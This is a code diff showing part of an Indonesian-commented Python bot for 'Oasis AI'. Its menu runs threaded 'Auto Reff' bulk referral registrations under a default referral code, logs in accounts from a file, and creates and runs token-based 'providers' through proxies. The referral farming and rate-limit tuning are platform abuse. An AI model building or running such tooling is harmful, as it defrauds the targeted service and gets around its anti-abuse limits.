+                    time.sleep(random.uniform(1, 2))
+                    
+            except Exception as e:
+                print_status(f"Error pada task {current}: {str(e)}", "error")
+                if attempt < 2:
+                    time.sleep(2)
+                    
+        task_queue.task_done()
+
+def process_referrals_threaded(num_referrals, referral_code, username_password, max_threads=10):
+    # Tingkatkan jumlah request per detik yang diizinkan
+    rate_limiter = RateLimiter(max_requests=8, time_window=1)
+    task_queue = queue.Queue()
+    for i in range(num_referrals):
+        task_queue.put(i)
+        
+    counter = ThreadSafeCounter()
+    progress_lock = threading.Lock()
+    
+    threads = []
+    num_threads = min(max_threads, num_referrals)
+    
+    print(f"[+] Memulai {num_threads} threads")
+    
+    for _ in range(num_threads):
+        thread = threading.Thread(
+            target=worker,
+            args=(task_queue, rate_limiter, counter, num_referrals, referral_code, progress_lock, username_password)
+        )
+        thread.daemon = True  # Set thread sebagai daemon
+        thread.start()
+        threads.append(thread)
+        # Tambahkan delay kecil antar pembuatan thread
+        time.sleep(0.1)
+        
+    try:
+        task_queue.join()
+    except KeyboardInterrupt:
+        print("\n[!] Menghentikan proses...")
+        return
+        
+    for thread in threads:
+        thread.join()
+        
+    print("\n[+] Semua tasks selesai")
+
+async def create_providers(console, username, is_premium):
+    """Fungsi untuk membuat providers"""
+    console.print("\n[bold cyan]OASIS AI CREATE PROVIDERS[/bold cyan]")
+    console.print("[cyan]─" * 30 + "[/cyan]\n")
+    
+    try:
+        # Cek apakah file tokens.txt ada
+        try:
+            with open('tokens.txt', 'r') as f:
+                tokens = f.read().strip().splitlines()
+                if not tokens:
+                    raise FileNotFoundError
+        except FileNotFoundError:
+            print_status("File tokens.txt tidak ditemukan atau kosong", "error")
+            print_status("Silakan login terlebih dahulu untuk mendapatkan token", "info")
+            return
+
+        num_providers = int(console.input("[bold white]Jumlah providers per akun (1-5) : [/bold white]"))
+        
+        # Tambahkan pengecekan batasan provider berdasarkan username
+        if username != "120698":  # Username khusus tanpa batasan
+            if num_providers > 5:
+                print_status("Maksimal 5 providers per akun untuk user biasa", "warning")
+                num_providers = 5
+        
+        if num_providers < 1:
+            print_status("Jumlah providers minimal 1", "error")
+            return
+            
+        print_status("\nMemulai pembuatan providers...", "info")
+        
+        # Jalankan create_providers dari api.providers
+        success = await create_providers_util(num_providers, is_premium)
+        
+        if success:
+            print_status("\nPembuatan providers selesai", "success")
+            print_status("Token providers tersimpan di providers.txt", "info")
+            
+            # Hapus akun dari accounts.txt setelah provider berhasil dibuat
+            with open('accounts.txt', 'r') as f:
+                accounts = f.readlines()
+            with open('accounts.txt', 'w') as f:
+                for account in accounts:
+                    if username not in account:
+                        f.write(account)
+        else:
+            print_status("\nGagal membuat providers", "error")
+            
+    except ValueError:
+        print_status("Input tidak valid", "error")
+    except Exception as e:
+        print_status(f"Error: {str(e)}", "error")
+    
+    console.input("\n[bold white]Tekan Enter untuk kembali ke menu[/bold white]")
+
+async def run_providers(console, username, is_premium):
+    """Fungsi untuk menjalankan providers"""
+    console.print("\n[bold cyan]OASIS AI RUN PROVIDERS[/bold cyan]")
+    console.print("[cyan]─" * 30 + "[/cyan]\n")
+    
+    try:
+        # Tanya apakah ingin menggunakan proxy
+        use_proxy = 'y'
+        
+        # Jalankan run_providers dari api.providers
+        run_providers_util(use_proxy, is_premium)
+            
+    except Exception as e:
+        print_status(f"Error: {str(e)}", "error")
+    
+    console.input("\n[bold white]Tekan Enter untuk kembali ke menu[/bold white]")
+
+async def main():
+    clear()
+    key_bot()
+    
+    console = create_styled_console()
+    console.print("\n[bold cyan]PILIH TIPE USER[/bold cyan]")
+    console.print("[cyan]─" * 30 + "[/cyan]\n")
+    console.print("[1] Premium User")
+    console.print("[2] Free User\n")
+    
+    user_type = console.input("[bold white]Pilih tipe user (1-2): [/bold white]")
+    
+    if user_type not in ["1", "2"]:
+        console.print("\n[red]Pilihan tidak valid![/red]")
+        return
+        
+    is_premium = user_type == "1"
+    
+    if is_premium:
+        success, username = verify_password()
+        if not success:
+            return
+    else:
+        username = "free_user"
+    
+    while True:
+        clear()
+        key_bot()
+        console.print("\n[bold cyan]OASIS AI MENU[/bold cyan]")
+        console.print("[cyan]─" * 30 + "[/cyan]\n")
+        
+        if is_premium:
+            console.print("[1] Register (Auto Reff)")
+            console.print("[2] Login")
+            console.print("[3] Create Providers")
+            console.print("[4] Run Providers")
+        else:
+            console.print("[1] Login")
+            console.print("[2] Create Providers")
+            console.print("[3] Run Providers")
+        
+        console.print("[0] Keluar\n")
+        console.print("[cyan]─" * 30 + "[/cyan]")
+        
+        choice = console.input("\n[bold white]Pilih menu (0-4): [/bold white]")
+        
+        if is_premium:
+            if choice == "1":
+                clear()
+                key_bot()
+                auto_reff(console, username)
+            elif choice == "2":
+                clear()
+                key_bot()
+                from api.login import login_from_file
+                login_from_file('accounts.txt', console)
+                console.input("\n[bold white]Tekan Enter untuk kembali ke menu[/bold white]")
+            elif choice == "3":
+                clear()
+                key_bot()
+                await create_providers(console, username, is_premium)
+            elif choice == "4":
+                clear()
+                key_bot()
+                await run_providers(console, username, is_premium)
+        else:
+            if choice == "1":
+                clear()
+                key_bot()
+                from api.login import login_from_file
+                login_from_file('accounts.txt', console)
+                console.input("\n[bold white]Tekan Enter untuk kembali ke menu[/bold white]")
+            elif choice == "2":
+                clear()
+                key_bot()
+                await create_providers(console, username, is_premium)
+            elif choice == "3":
+                clear()
+                key_bot()
+                await run_providers(console, username, is_premium)
+                
+        if choice == "0":
+            console.print("\n[cyan]Terima kasih telah menggunakan layanan kami[/cyan]")
+            break
+        elif choice not in ["0", "1", "2", "3", "4"]:
+            console.print("\n[red]Pilihan tidak valid![/red]")
+            time.sleep(1)
+
+def auto_reff(console, username):
+    """Fungsi untuk menangani fitur Auto Reff"""
+    console.print("\n[bold cyan]OASIS AI REFERRAL[/bold cyan]")
+    console.print("[cyan]─" * 30 + "[/cyan]\n")
+    
+    total_reff, max_reff = get_max_referral(username)
+    if total_reff is None or max_reff is None:
+        print_status("Gagal mendapatkan informasi referral", "error")
+        return
+        
+    remaining_reff = max_reff - total_reff
+    if remaining_reff <= 0:
+        print_status(f"Batas maksimal referral ({max_reff}) telah tercapai", "error")
+        return
+        
+    print_status(f"Sisa referral yang tersedia: {remaining_reff}", "info")
+    
+    num_referrals = int(console.input("[bold white]Jumlah referral : [/bold white]"))
+    if num_referrals > remaining_reff:
+        print_status(f"Jumlah referral melebihi batas tersisa ({remaining_reff})", "error")
+        return
+        
+    max_threads = int(console.input("[bold white]Jumlah thread   : [/bold white]"))
+    if max_threads < 1:
+        max_threads = 1
+    elif max_threads > 10:
+        print_status("Maksimal 10 thread untuk menghindari rate limit", "warning")
+        max_threads = 10
+        
+    referral_code = console.input("[bold white]Kode referral  : [/bold white]").strip()
+    
+    if not referral_code:
+        referral_code = "itbaarts"
+        print_status(f"\nMenggunakan kode referral: {referral_code}", "info")
+    
+    console.print()
+    
+    # Jalankan proses dengan threading
+    process_referrals_threaded(num_referrals, referral_code, username, max_threads)
+    
+    console.print("\n")
+    console.print("[cyan]─" * 30 + "[/cyan]")
+    print_status("Proses selesai", "success")
+    console.input("\n[bold white]Tekan Enter untuk kembali ke menu[/bold white]")
+
+# Update entry point
+if __name__ == "__main__":
+    import asyncio
+    asyncio.run(main())
